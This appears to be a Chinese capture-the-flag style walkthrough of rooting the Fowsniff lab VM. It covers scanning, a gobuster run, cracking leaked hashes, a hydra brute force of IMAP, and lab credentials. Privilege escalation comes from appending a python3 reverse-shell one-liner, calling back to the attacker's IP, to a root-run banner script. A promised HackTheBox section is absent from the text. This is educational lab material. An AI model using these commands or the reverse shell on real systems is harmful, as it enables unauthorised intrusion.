> 原文链接: https://www.anquanke.com//post/id/164639 


# 渗透测试实战-Fowsniff靶机入侵+HTB(hackthebox)入坑


                                阅读量   
                                **424009**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">17</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t017e9184f513b589d4.jpg)](https://p1.ssl.qhimg.com/t017e9184f513b589d4.jpg)



## 前言

大家好，爱写靶机入侵文章的我又来了！本次靶机为Fowsniff，因为不是很难内容不多，但是有些情况肯定在真实的攻击环境中还是有可能碰到和利用的，但是为了小弟还是在文章后面小弟加入了国外的一个在线靶机入侵测试平台的基础入坑第一篇。



## 靶机安装/下载

Fowsniff靶机下载：[https://pan.baidu.com/s/1dvCJijStPYkeGtoSaLyg7A](https://pan.baidu.com/s/1dvCJijStPYkeGtoSaLyg7A)

靶机IP: 172.16.24.55

攻击者ip：172.16.24.38

[![](https://p5.ssl.qhimg.com/t0109c7b9bb6bd5de8e.png)](https://p5.ssl.qhimg.com/t0109c7b9bb6bd5de8e.png)



## 实战

#### <a name="Fowsniff%E9%9D%B6%E6%9C%BA%E5%85%A5%E4%BE%B5"></a>Fowsniff靶机入侵

第一步老规矩探测ip：

[![](https://p2.ssl.qhimg.com/t0144a07d0a9bb54132.png)](https://p2.ssl.qhimg.com/t0144a07d0a9bb54132.png)

（这里有小伙伴要问了，为什么我有些靶机探测不到ip呢？其实大家可以通过另外一种方法，如：直接用nmap探测网段的80端口、22端口，这样会发现有些如arp-scan等一些工具无法探测出靶机IP的问题）

下一步自然就是端口扫描了，小弟这里还是使用nmap神器完成：

[![](https://p3.ssl.qhimg.com/t013e51d972f7289dee.png)](https://p3.ssl.qhimg.com/t013e51d972f7289dee.png)

通过扫描可以看到该靶机开放了4个端口，除了80、22端口，还有一个pop3和imap端口，如果有小伙伴看过小弟前面几篇文章的话，您肯定知道，pop3是什么东西干嘛用的。

下一步我们还是一样，查看80端口，看能不能突破，如图：

[![](https://p0.ssl.qhimg.com/t01251d683058b5d473.png)](https://p0.ssl.qhimg.com/t01251d683058b5d473.png)

可以看到首页上还是比较干净的，那么我们还是继续使用目录猜解工具跑一下目录看看，这里您可以使用dirb啊、御剑啊等等，小弟这里使用 gobuster 来完成这个工作，

命令：gobuster -u [http://172.16.24.55](http://172.16.24.55) -s 200,301,302 -w /Users/d3ckx1/Desktop/wordlists/directory-list-2.3-my.txt -t 35

（命令介绍：-u 是目标IP/域名；-s 是http返回值；-w 是目录字典 -t 是线程）

[![](https://p2.ssl.qhimg.com/t01addf1bfc16a837c0.png)](https://p2.ssl.qhimg.com/t01addf1bfc16a837c0.png)

通过目录猜解可以看到没有出现可疑的目录，那么根据这些靶机的尿性，突破口肯定是在首页或者其他页面，我们把目光放在首页上

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017ab3bf208bbfea7e.png)

通过首页上的接受，说明网站被人搞了，[@fowsniffcorp](https://github.com/fowsniffcorp)的信息肯定被攻击者泄漏放在互联网上了，这时候不用怀疑是时候表演表演真正的谷歌技术了，

1.打开谷歌

2.输入 [@fowsniffcorp](https://github.com/fowsniffcorp) 回车

就出现了这个网站：[https://pastebin.com/NrAqVeeX](https://pastebin.com/NrAqVeeX)

[![](https://p0.ssl.qhimg.com/t01d0adcf7e8fe80595.png)](https://p0.ssl.qhimg.com/t01d0adcf7e8fe80595.png)

在这个泄漏的信息里我们拿到一些账户和加密的密码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d5bdffc8de6ecc75.png)

下一步我们需要把这些md5的密文解密并跟账户分开保存，方便后面的破解工作，批量md5密文解密小弟用了somd5的平台，地址：

[https://www.somd5.com/batch.html](https://www.somd5.com/batch.html)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01550d1577ffd5c703.png)

可以看到只有一个密文无法解密，但是不影响我们继续下一步工作，这个时候我们把目标放在imap服务上，我们先探测一下看看这个服务，小弟这里使用msf来，您也可以在前面探测的时候直接加上nmap的 script模块

[![](https://p5.ssl.qhimg.com/t013606d0192e756664.png)](https://p5.ssl.qhimg.com/t013606d0192e756664.png)

可以看到这个服务是正常使用的，下一步我们就是使用刚刚获取到的账户密码破解试试，这里小弟还是继续使用hydra来完成，您也可以使用其他工具，命令如下：<br>
hydra -L /Users/d3ckx1/Desktop/imap-user.txt -P /Users/d3ckx1/Desktop/mailcall-pass.txt imap://172.16.24.55

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t017cb2be55080299f0.png)

成功破解出密码：seina ：scoobydoo2，

下一步我们试着登陆看看，到了这里有小伙伴就要问了，这个服务这么登陆呢？这里你可以使用命令行来登陆，也可以使用foxmail来登陆，小弟这里使用foxmail来登陆，配置如下：

1.设置-新建

[![](https://p5.ssl.qhimg.com/t01258aeb61bdd3561a.png)](https://p5.ssl.qhimg.com/t01258aeb61bdd3561a.png)

2.接收服务器类型-选择“imap”

3.2个服务器都写你的靶机ip

[![](https://p5.ssl.qhimg.com/t01c1a062a2a763c0d2.png)](https://p5.ssl.qhimg.com/t01c1a062a2a763c0d2.png)

配置好以后，收到了2个邮件，其中在一个邮件里收到了一个密码，如图：

[![](https://p1.ssl.qhimg.com/t014cc266e748fe3363.png)](https://p1.ssl.qhimg.com/t014cc266e748fe3363.png)

密码为：S1ck3nBluff+secureshell

下面我们使用这个密码去登陆 “baksteen”账户，为什么是他呢？因为第二封邮件他回复了。。。。

[![](https://p0.ssl.qhimg.com/t014661003cd073d99a.png)](https://p0.ssl.qhimg.com/t014661003cd073d99a.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0178b097235ef03ab8.png)

成功登陆了，下一步就是提权了，老规矩我们在/tmp目录下上传2个提权脚本，如图：

[![](https://p0.ssl.qhimg.com/t010ab84520fa71f07a.png)](https://p0.ssl.qhimg.com/t010ab84520fa71f07a.png)

这里说一下，可千万别忽略和小看提权脚本哦，你可能能在这里找到突破口。

[![](https://p5.ssl.qhimg.com/t016ea589fc171325c9.png)](https://p5.ssl.qhimg.com/t016ea589fc171325c9.png)

在运行“linuxprivchecker.py”的时候可以看到靶机只安装了python3，

通过另外一个脚本，没发现什么突破口，

[![](https://p1.ssl.qhimg.com/t015fd2a2161c470ff7.png)](https://p1.ssl.qhimg.com/t015fd2a2161c470ff7.png)

到了这里小弟被卡了一段时间，最后小弟因为下班回家，又重新登陆了一下这个ssh，看到登陆的banner引起了我的警觉… 这尼玛肯定又问题，使用我在用户目录下面查看，如图：

[![](https://p3.ssl.qhimg.com/t011672cf97804be865.png)](https://p3.ssl.qhimg.com/t011672cf97804be865.png)

[![](https://p1.ssl.qhimg.com/t012bf06d2ddc41408f.png)](https://p1.ssl.qhimg.com/t012bf06d2ddc41408f.png)

.viminfo文件

[![](https://p4.ssl.qhimg.com/t01c8eb01a42b63ba52.png)](https://p4.ssl.qhimg.com/t01c8eb01a42b63ba52.png)

发现可以文件 /opt/cube/cube.sh

我们切换目录下查看一下，这个文件权限如何

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017e679bd1da37d791.png)

下面就是修改这个文件，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014c1bca81037713d8.png)

我们在后面加上我们的反弹shell，

这里的shellcode为：python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“你的ip”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/bash”,”-i”]);’

（注：这里可以通过前面已经知道该靶机只有安装python3，故前面是 python3.）

保存！然后我们在本机运行nc来监听接收6666端口流量

[![](https://p2.ssl.qhimg.com/t01b73a3e00d71fc483.png)](https://p2.ssl.qhimg.com/t01b73a3e00d71fc483.png)

到了这里就比较重要了，这里需要另外开一个命令行，重新去登陆刚刚“baksteen”ssh账户，如图：

[![](https://p1.ssl.qhimg.com/t01d30715de8eb8d4bf.png)](https://p1.ssl.qhimg.com/t01d30715de8eb8d4bf.png)

在这里输入刚刚邮箱里的ssh密码后，我们就马上得到了一个root_shell

[![](https://p1.ssl.qhimg.com/t01fb6f409e553f1dfd.png)](https://p1.ssl.qhimg.com/t01fb6f409e553f1dfd.png)

最后拿flag

[![](https://p2.ssl.qhimg.com/t01096bd36713519ad5.png)](https://p2.ssl.qhimg.com/t01096bd36713519ad5.png)

本靶机完！！<a name="HTB(hackthebox)%E5%85%A5%E5%9D%91"></a>



## 结语

通过这篇文章，可以发现有很多场景再平时正常入侵/渗透中还是可以碰到的，如前面第一篇靶机测试中，针对该目标的google的信息搜集工作，在提权时，出现的一个大大的banner，我相信正式环境中也是有的，小伙伴们以后也可以通过查看这个文件是否有权限来写入shellcode来完成提权，在第二篇文章中，可以查看js文件，不一定会有收获哦！
